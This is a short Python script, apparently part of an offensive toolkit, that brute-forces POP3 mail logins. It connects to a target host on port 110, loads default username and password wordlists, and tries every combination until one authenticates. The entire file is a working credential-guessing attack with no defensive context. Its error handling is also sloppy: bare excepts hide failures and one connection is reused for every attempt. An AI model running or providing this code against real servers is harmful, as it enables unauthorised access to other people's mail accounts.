from __future__ import print_function
import poplib
import time
import socket

popuser = []
poppass = []

def popbrute(web):

    try:
        time.sleep(0.5)
        ip = socket.gethostbyname(web)
        port = '110'
        pop = poplib.POP3(ip,int(port))
        time.sleep(0.8)
        try:
            with open('files/brute-db/pop/pop_defuser.lst','r') as users:
                for u in users:
                    u = u.strip('\n')
                    popuser.append(u)

            with open('files/brute-db/pop/pop_defpass.lst','r') as pas:
                for p in pas:
                    p = p.strip('\n')
                    poppass.append(p)
        except IOError:
            pass

        for user in popuser:
            for password in poppass:
                try:
                    pop.user(str(user))
                    pop.pass_(password)
                    if True:
                        return user,password
                except:
                    pass
    except:
       pass